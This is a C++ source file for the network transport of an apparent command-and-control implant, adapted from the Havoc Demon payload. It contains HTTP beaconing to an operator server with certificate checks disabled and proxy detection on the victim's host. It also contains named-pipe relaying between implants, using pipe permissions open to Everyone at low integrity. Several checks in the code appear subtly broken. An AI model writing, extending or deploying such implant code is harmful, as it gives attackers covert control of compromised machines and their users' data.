#include <include/network.hpp>
namespace Http {
    using namespace Random;

    // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/TransportHttp.c#L21
    VOID HttpCallback(PSTREAM Outbound, PSTREAM *Inbound) {
        HEXANE

        HINTERNET Connect = nullptr;
        HINTERNET Request = nullptr;

        WINHTTP_PROXY_INFO ProxyInfo = { };
        WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig = { };
        WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions = { };

        LPVOID Buffer       = { };
        LPVOID Download     = { };

        DWORD Read          = 0;
        DWORD Length        = 0;
        DWORD Total         = 0;
        DWORD Status        = 0;
        DWORD nStatus       = sizeof(DWORD);

        LPWSTR Header       = { };
        LPWSTR Endpoint     = { };
        DWORD Flags         = 0;
        DWORD nEndpoint     = 0;
        DWORD nHeaders      = 0;

        Ctx->Transport.http->Method = L"GET";

        if (!Ctx->Transport.http->Handle) {
            if (!(Ctx->Transport.http->Handle = Ctx->win32.WinHttpOpen(Ctx->Transport.http->Useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
                return_defer(ntstatus);
            }
        }

        if (!(Connect = Ctx->win32.WinHttpConnect(Ctx->Transport.http->Handle, Ctx->Transport.http->Address, Ctx->Transport.http->Port, 0))) {
            return_defer(ntstatus);
        }

        nEndpoint   = RandomNumber32();
        Endpoint    = Ctx->Transport.http->Endpoints[nEndpoint % Ctx->Transport.http->nEndpoints];
        Flags       = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

        if (Ctx->Transport.bSSL) {
            Flags |= WINHTTP_FLAG_SECURE;
        }

        if (!(Request = Ctx->win32.WinHttpOpenRequest(Connect, Ctx->Transport.http->Method, Endpoint, nullptr, nullptr, nullptr, Flags))) {
            return_defer(ntstatus);
        }

        if (Ctx->Transport.bSSL) {
            Flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

            if (!Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_SECURITY_FLAGS, &Flags, sizeof(DWORD))) {
                return_defer(ntstatus);
            }
        }

        if (Ctx->Transport.http->Headers) {
            // macro is redundant and silly but makes it looks nicer/ slightly less typing.
            DYN_ARRAY_EXPR(
                nHeaders, Ctx->Transport.http->Headers,
                Header = Ctx->Transport.http->Headers[nHeaders]->Buffer;

            if (!Ctx->win32.WinHttpAddRequestHeaders(Request, Header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
                return_defer(ntstatus);
            });
        }

        if (Ctx->Transport.bProxy) {
            // Proxy-Awareness : https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/TransportHttp.c#L138

            ProxyInfo.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
            ProxyInfo.lpszProxy     = Ctx->Transport.http->ProxyAddress;

            if (!Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof(WINHTTP_PROXY_INFO))) {
                return_defer(ntstatus);
            }

            if (Ctx->Transport.http->ProxyUsername && Ctx->Transport.http->ProxyPassword) {
                if (
                    !Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_PROXY_USERNAME, Ctx->Transport.http->ProxyUsername, x_wcslen(Ctx->Transport.http->ProxyUsername)) ||
                    !Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->Transport.http->ProxyPassword, x_wcslen(Ctx->Transport.http->ProxyPassword))) {
                    return_defer(ntstatus);
                }
            }
        } else if (!Ctx->Transport.bEnvProxyCheck) {

            AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
            AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
            AutoProxyOptions.lpszAutoConfigUrl      = nullptr;
            AutoProxyOptions.lpvReserved            = nullptr;
            AutoProxyOptions.dwReserved             = 0;
            AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

            if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->Handle, Endpoint, &AutoProxyOptions, &ProxyInfo)) {
                Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
                Ctx->Transport.EnvProxy     = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, (ULONG) NULL, Ctx->Transport.EnvProxyLen);

                x_memcpy(Ctx->Transport.EnvProxy, &ProxyInfo, Ctx->Transport.EnvProxyLen);

            } else {
                if (Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&ProxyConfig)) {

                    if (ProxyConfig.lpszProxy != nullptr && x_wcslen(ProxyConfig.lpszProxy) != 0) {
                        ProxyInfo.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                        ProxyInfo.lpszProxy         = ProxyConfig.lpszProxy;
                        ProxyInfo.lpszProxyBypass   = ProxyConfig.lpszProxyBypass;
                        Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);

                        Ctx->Transport.EnvProxy = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.EnvProxyLen);
                        x_memcpy(Ctx->Transport.EnvProxy, &ProxyInfo, Ctx->Transport.EnvProxyLen);

                        ProxyConfig.lpszProxy       = nullptr;
                        ProxyConfig.lpszProxyBypass = nullptr;

                    } else if (ProxyConfig.lpszAutoConfigUrl != nullptr && x_wcslen(ProxyConfig.lpszAutoConfigUrl) != 0) {
                        AutoProxyOptions.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
                        AutoProxyOptions.lpszAutoConfigUrl  = ProxyConfig.lpszAutoConfigUrl;
                        AutoProxyOptions.dwAutoDetectFlags  = 0;

                        Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->Handle, Endpoint, &AutoProxyOptions, &ProxyInfo);
                        Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);

                        Ctx->Transport.EnvProxy = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.EnvProxyLen);
                        x_memcpy(Ctx->Transport.EnvProxy, &ProxyInfo, Ctx->Transport.EnvProxyLen);
                    }
                }
            }
            Ctx->Transport.bEnvProxyCheck = TRUE;
        }

        if (Ctx->Transport.EnvProxy) {
            if (!Ctx->win32.WinHttpSetOption(Request, WINHTTP_OPTION_PROXY, Ctx->Transport.EnvProxy, Ctx->Transport.EnvProxyLen)) {
                return_defer(ntstatus);
            }
        }

        if (
            !Ctx->win32.WinHttpSendRequest(Request, nullptr, 0, Outbound->Buffer, Outbound->Length, Outbound->Length, 0) ||
            !Ctx->win32.WinHttpReceiveResponse(Request, nullptr)) {
            return_defer(ntstatus);
        }

        if (!Ctx->win32.WinHttpQueryHeaders(Request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &Status, &nStatus, nullptr)) {
            return_defer(ntstatus);
        }
        if (Status != HTTP_STATUS_OK) {
            return_defer(Status);
        }

        do {
            if (
                !(Ctx->win32.WinHttpQueryDataAvailable(Request, &Length))) {
                return_defer(ntstatus);
            }

            if (!Buffer) {
                Buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, Length + 1);
            }

            if (!Download) {
                Download = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Length + 1);
            } else {
                Download = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Download, Total + Length + 1);
            }

            x_memset(Buffer, 0, Length + 1);

            if (!Ctx->win32.WinHttpReadData(Request, Buffer, Length, &Read)) {
                return_defer(ntstatus);
            }

            x_memcpy(B_PTR(Download) + Total, Buffer, Read);
            ZeroFreePtr(Buffer, Read);

            Total += Read;

        } while (Length > 0);

        (*Inbound) = (PSTREAM) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM));
        (*Inbound)->Buffer = Download;
        (*Inbound)->Length = Total;

        defer:
        if (Request) { Ctx->win32.WinHttpCloseHandle(Request); }
        if (Connect) { Ctx->win32.WinHttpCloseHandle(Connect); }

        if (ProxyConfig.lpszProxy) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, ProxyConfig.lpszProxy); }
        if (ProxyConfig.lpszProxyBypass) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, ProxyConfig.lpszProxyBypass); }
        if (ProxyConfig.lpszAutoConfigUrl) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, ProxyConfig.lpszAutoConfigUrl); }
    }
}

namespace Smb {

    VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr) {
        HEXANE

        if (SmbSecAttr->Sid) {
            Ctx->win32.FreeSid(SmbSecAttr->Sid);
            SmbSecAttr->Sid = nullptr;
        }
        if (SmbSecAttr->SidLow) {
            Ctx->win32.FreeSid(SmbSecAttr->SidLow);
            SmbSecAttr->SidLow = nullptr;
        }
        if (SmbSecAttr->pAcl) {
            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, SmbSecAttr->pAcl);
        }
        if (SmbSecAttr->SecDesc) {
            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, SmbSecAttr->SecDesc);
        }
    }

    VOID SmbContextInit(PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
        HEXANE

        SID_IDENTIFIER_AUTHORITY sid_auth = SECURITY_WORLD_SID_AUTHORITY;
        SID_IDENTIFIER_AUTHORITY sid_label = SECURITY_MANDATORY_LABEL_AUTHORITY;

        EXPLICIT_ACCESSA access = {};
        PACL acl = {};
        DWORD result = 0;

        x_memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
        x_memset(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));

        if (!Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->SidLow)) {
            return_defer(ERROR_INVALID_SID);
        }

        access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
        access.grfInheritance = NO_INHERITANCE;
        access.grfAccessMode = SET_ACCESS;

        access.Trustee.TrusteeForm = TRUSTEE_IS_SID;
        access.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
        access.Trustee.ptstrName = (PCHAR) SmbSecAttr->Sid;

        if (
            !(result = Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl)) ||
            !Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->SidLow)) {
            return_defer(ERROR_INVALID_SID);
        }

        if (!(SmbSecAttr->pAcl = (PACL) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH))) {
            return_defer(ERROR_NOT_ENOUGH_MEMORY);
        }

        if (
            !Ctx->win32.InitializeAcl(SmbSecAttr->pAcl, MAX_PATH, ACL_REVISION_DS) ||
            !Ctx->win32.AddMandatoryAce(SmbSecAttr->pAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->SidLow)) {
            return_defer(ERROR_NO_ACE_CONDITION);
        }

        if (!(SmbSecAttr->SecDesc = (PSECURITY_DESCRIPTOR) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, SECURITY_DESCRIPTOR_MIN_LENGTH))) {
            return_defer(ERROR_INVALID_SECURITY_DESCR);
        }

        if (
            !Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->SecDesc, SECURITY_DESCRIPTOR_REVISION) ||
            !Ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->SecDesc, TRUE, acl, FALSE) ||
            !Ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->SecDesc, TRUE, SmbSecAttr->pAcl, FALSE)) {
            return_defer(ERROR_INVALID_SECURITY_DESCR);
        }

        defer:
        if (ntstatus == STATUS_SUCCESS) {
            SecAttr->lpSecurityDescriptor = SmbSecAttr->SecDesc;
            SecAttr->nLength = sizeof(SECURITY_ATTRIBUTES);
            SecAttr->bInheritHandle = FALSE;
        }
    }

    BOOL PipeRead(PSTREAM Inbound, HANDLE Handle) {
        HEXANE

        DWORD Read = 0;
        DWORD Total = 0;

        do {
            if (!Ctx->win32.ReadFile(Handle, B_PTR(Inbound->Buffer) + Total, MIN((Inbound->Length - Total), PIPE_BUFFER_MAX), &Read, nullptr)) {
                if (ntstatus == ERROR_NO_DATA) {
                    return FALSE;
                }
            }

            Total += Read;
        } while (Total < Inbound->Length);
        return TRUE;
    }

    BOOL PipeWrite(PSTREAM Outbound, HANDLE Handle) {
        HEXANE

        DWORD Total = 0;
        DWORD Write = 0;

        do {
            if (!Ctx->win32.WriteFile(Handle, B_PTR(Outbound->Buffer) + Total, MIN((Outbound->Length - Total), PIPE_BUFFER_MAX), &Write, nullptr)) {
                return FALSE;
            }

            Total += Write;
        } while (Total < Outbound->Length);
        return TRUE;
    }

    VOID PeerConnectIngress (PSTREAM Outbound, PSTREAM *Inbound) {
        HEXANE

        HANDLE Handle = Ctx->Config.IngressPipename;
        SMB_PIPE_SEC_ATTR SmbSecAttr = { };
        SECURITY_ATTRIBUTES SecAttr = { };

        DWORD cbBytes = 0;
        DWORD MsgSize = 0;
        DWORD PeerId = 0;

        if (!Handle) {
            SmbContextInit(&SmbSecAttr, &SecAttr);
            if (!(Handle = Ctx->win32.CreateNamedPipeW(Ctx->Config.IngressPipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &SecAttr))) {
                return_defer(ntstatus);
            }

            SmbContextDestroy(&SmbSecAttr);
            if (!Ctx->win32.ConnectNamedPipe(Handle, nullptr)) {
                return_defer(ERROR_BROKEN_PIPE);
            }
        }

        if (!Ctx->win32.PeekNamedPipe(Handle, nullptr, 0, nullptr, &cbBytes, nullptr)) {
            return_defer(ntstatus);
        }

        if (cbBytes > sizeof(uint32_t) * 2) {
            MsgSize = cbBytes;

            if (!Ctx->win32.ReadFile(Handle, &PeerId, sizeof(uint32_t), &cbBytes, nullptr)) {
                return_defer(ntstatus);
            }
            if (Ctx->Session.PeerId != PeerId) {
                return_defer(ERROR_NOT_READY);
            }

            (*Inbound) = (PSTREAM) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM));
            (*Inbound)->Buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, MsgSize);
            (*Inbound)->Length = MsgSize;

            PipeRead(*Inbound, Handle);

        } else {
            return_defer(ERROR_INSUFFICIENT_BUFFER);
        }

        if (Outbound) {
            if (!PipeWrite(Outbound, Handle)) {
                return_defer(ERROR_WRITE_FAULT);
            }
        }

        defer:
        return;
    }

    VOID PeerConnectEgress(PSTREAM Outbound, PSTREAM *Inbound) {
        HEXANE

        auto Handle = Ctx->Config.EgressHandle;
        auto Pipename = Ctx->Config.EgressPipename;

        if (!(Handle = Ctx->win32.CreateFileW(Pipename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
            if (Handle == INVALID_HANDLE_VALUE && ntstatus == ERROR_PIPE_BUSY) {

                if (!Ctx->win32.WaitNamedPipeW(Pipename, 5000)) {
                    return_defer(ERROR_NOT_READY);
                }
            } else {
                return_defer(ntstatus);
            }
        }

        if (Ctx->win32.PeekNamedPipe(Handle, nullptr, 0, nullptr, &(*Inbound)->Length, nullptr)) {
            if ((*Inbound)->Length > 0) {

                if (!PipeRead(*Inbound, Handle)) {
                    return_defer(ntstatus);
                }
            } else {
                return_defer(ERROR_INSUFFICIENT_BUFFER);
            }
        }
        if (!PipeWrite(Outbound, Handle)) {
            return_defer(ntstatus);
        }

        defer:
        return;
    }
}
